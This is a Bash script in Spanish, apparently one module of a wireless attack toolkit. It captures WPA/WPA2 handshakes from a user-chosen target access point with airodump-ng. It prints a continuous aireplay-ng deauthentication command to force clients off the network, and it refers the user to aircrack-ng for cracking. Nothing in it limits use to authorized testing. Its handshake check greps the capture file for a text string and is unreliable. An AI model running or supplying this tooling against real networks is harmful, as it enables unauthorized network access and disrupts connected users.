#!/bin/bash

# handshake.sh - Módulo para capturar handshakes WPA/WPA2

source ../assets/colors.sh

# Función para verificar si una interfaz está en modo monitor
is_monitor_mode() {
  INTERFACE=$1
  if iwconfig "$INTERFACE" | grep -q "Mode:Monitor"; then
    return 0 # Está en modo monitor
  else
    return 1 # No está en modo monitor
  fi
}

# Función para capturar handshakes
capture_handshake() {
  print_yellow "[*] Iniciando captura de handshakes WPA/WPA2."
  read -p "Ingrese la interfaz en modo monitor (ej. wlan0mon): " monitor_interface

  if ! is_monitor_mode "$monitor_interface"; then
    print_red "[-] La interfaz \'$monitor_interface\' no está en modo monitor. Por favor, active el modo monitor primero."
    return 1
  fi

  read -p "Ingrese el BSSID del punto de acceso objetivo (ej. AA:BB:CC:DD:EE:FF): " target_bssid
  read -p "Ingrese el canal del punto de acceso objetivo (ej. 6): " target_channel
  read -p "Ingrese el nombre del archivo para guardar la captura (sin extensión, ej. my_handshake): " output_filename

  OUTPUT_PATH="../logs/${output_filename}_$(date +%F_%H-%M-%S)"

  print_green "[+] Iniciando airodump-ng para capturar el handshake. Presione Ctrl+C para detener una vez capturado."
  print_green "[+] Escuchando en el canal $target_channel para el BSSID $target_bssid."
  print_green "[+] Archivo de salida: ${OUTPUT_PATH}.cap"

  # Iniciar airodump-ng en segundo plano
  sudo airodump-ng "$monitor_interface" --bssid "$target_bssid" --channel "$target_channel" -w "$OUTPUT_PATH" & 
  AIRODUMP_PID=$!

  print_yellow "[*] Esperando la captura del handshake..."
  print_yellow "[*] Puede usar aireplay-ng en otra terminal para forzar la desautenticación de un cliente:"
  print_yellow "    sudo aireplay-ng --deauth 0 -a $target_bssid -c <CLIENT_MAC> $monitor_interface"
  print_yellow "    O simplemente espere a que un cliente se conecte/reconecte."

  # Esperar a que airodump-ng detecte un handshake
  # Esto es un bucle simple, en un entorno real se podría parsear el output de airodump-ng
  # o el archivo .cap para una detección más precisa.
  HANDSHAKE_CAPTURED=0
  for i in $(seq 1 60); do # Esperar hasta 60 segundos por el handshake
    if grep -q "WPA Handshake" "${OUTPUT_PATH}-01.cap" 2>/dev/null; then
      HANDSHAKE_CAPTURED=1
      break
    fi
    sleep 1
  done

  if [ $HANDSHAKE_CAPTURED -eq 1 ]; then
    print_green "[+] ¡Handshake WPA/WPA2 capturado exitosamente!"
  else
    print_red "[-] No se detectó un handshake WPA/WPA2 en el tiempo esperado. Puede que necesite forzar la desautenticación."
  fi

  # Detener airodump-ng
  sudo kill $AIRODUMP_PID
  wait $AIRODUMP_PID 2>/dev/null

  print_green "[+] Captura finalizada. Archivos guardados en ${OUTPUT_PATH}-01.cap y otros formatos."
  print_yellow "[*] Puede verificar el handshake con: aircrack-ng ${OUTPUT_PATH}-01.cap"
}

# Menú del módulo de captura de handshakes
handshake_menu() {
  while true; do
    clear
    print_green "================================================================================"
    print_green "                         MÓDULO DE CAPTURA DE HANDSHAKES                      "
    print_green "================================================================================"
    echo -e "\n${C_CYAN}Seleccione una opción:${C_NC}"
    echo -e "  ${C_YELLOW}1.${C_NC} Capturar Handshake WPA/WPA2"
    echo -e "  ${C_RED}0.${C_NC} Volver al menú principal\n"
    print_green "================================================================================"

    read -p "Opción: " hs_choice

    case $hs_choice in
      1) capture_handshake ;;
      0) break ;;
      *) print_red "Opción inválida. Presione cualquier tecla para continuar..."; read -n 1 ;;
    esac
    print_blue "Presione cualquier tecla para continuar..."
    read -n 1
  done
}

handshake_menu

